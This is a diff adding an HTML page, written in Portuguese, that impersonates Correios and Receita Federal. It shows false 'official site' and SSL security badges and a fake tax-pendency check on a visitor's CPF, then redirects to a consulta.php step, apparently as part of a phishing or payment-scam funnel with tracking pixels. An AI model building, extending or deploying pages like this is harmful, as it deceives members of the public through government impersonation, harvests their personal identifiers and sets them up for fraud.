@@ -1,0 +1,96 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+  <script src="assets/js/protect.js?v=20260814clear"></script>
+  <script src="assets/js/pixel-loader-utmify.js"></script>
+  <script src="assets/js/pixel-utmify.js"></script>
+  <meta name="theme-color" content="#003366">
+  <title>Consultando | Rastreamento de Encomendas</title>
+  <link rel="stylesheet" href="assets/css/correios-mobile.css?v=20260814f">
+</head>
+<body>
+  <div class="page page-landing page-index2">
+    <header class="landing-header">
+      <img src="assets/img/logo-correios-header.png" alt="Correios" class="landing-logo-full">
+    </header>
+
+    <div class="landing-ssl">
+      <svg class="landing-ssl-lock" viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><path fill="#003399" d="M18 8h-1V6a5 5 0 00-10 0v2H6a2 2 0 00-2 2v10a2 2 0 002 2h12a2 2 0 002-2V10a2 2 0 00-2-2zm-3 0H9V6a3 3 0 016 0v2z"/></svg>
+      <span class="landing-ssl-text">Conexão Segura SSL • Site Oficial dos Correios</span>
+      <svg class="landing-ssl-check" viewBox="0 0 24 24" width="13" height="13" aria-hidden="true"><path fill="#003399" d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+    </div>
+
+    <div class="landing-rf-wrap">
+      <div class="landing-rf-bar">
+        <div class="landing-rf-left">
+          <img src="assets/img/logo-rf-header.png" alt="Receita Federal" class="landing-rf-logo">
+          <span>Receita Federal</span>
+        </div>
+        <div class="landing-rf-right">
+          <strong>Sistema Integrado</strong>
+          <p class="landing-rf-status">
+            <span class="landing-dot" aria-hidden="true"></span>
+            Online • Seguro
+          </p>
+        </div>
+      </div>
+    </div>
+
+    <main class="landing-main">
+      <div class="landing-card loading-box">
+        <h1 class="landing-title" style="margin-top:0;" id="index2Titulo">Consultando CPF</h1>
+        <p class="landing-subtitle" id="index2Subtitulo">Portal Oficial de Consulta Fiscal</p>
+        <div class="spinner" aria-hidden="true"></div>
+        <p class="index2-loading-text" id="index2Texto">Aguarde enquanto verificamos pendências fiscais vinculadas ao seu CPF no sistema integrado.</p>
+      </div>
+    </main>
+
+    <footer class="landing-footer">
+      <img src="assets/img/rodape2.png" alt="Correios - Governo Federal">
+    </footer>
+  </div>
+
+  <script>
+    const urlParams = new URLSearchParams(window.location.search);
+    const cpf = urlParams.get("cpf");
+    const codigo = (urlParams.get("codigo") || "").replace(/[^A-Z0-9]/g, "").toUpperCase();
+    const cpfValido = cpf && cpf.replace(/\D/g, "").length === 11;
+    const codigoValido = /^[A-Z]{2}[0-9]{9}[A-Z]{2}$/.test(codigo);
+    const buildRedirectUrl = (path, updates) => {
+      const nextParams = new URLSearchParams(window.location.search);
+      Object.keys(updates).forEach((key) => {
+        const value = updates[key];
+        if (value === null || value === undefined || value === "") {
+          nextParams.delete(key);
+          return;
+        }
+        nextParams.set(key, value);
+      });
+      const query = nextParams.toString();
+      return path + (query ? "?" + query : "");
+    };
+
+    if (!cpfValido && !codigoValido) {
+      window.location.href = "index.html";
+    } else if (codigoValido) {
+      document.getElementById("index2Titulo").textContent = "Consultando código";
+      document.getElementById("index2Subtitulo").textContent = "Rastreamento de Encomendas";
+      document.getElementById("index2Texto").textContent = "Aguarde enquanto localizamos seu objeto no sistema integrado dos Correios.";
+      document.querySelector(".page-index2").classList.add("index2-rastreio");
+    }
+
+    if (cpfValido || codigoValido) {
+      setTimeout(function () {
+        if (cpfValido) {
+          window.location.href = buildRedirectUrl("consulta.php", { cpf: cpf.replace(/\D/g, ""), codigo: null });
+          return;
+        }
+
+        window.location.href = buildRedirectUrl("rastreio3.html", { codigo: codigo, cpf: null });
+      }, 3500);
+    }
+  </script>
+</body>
+</html>
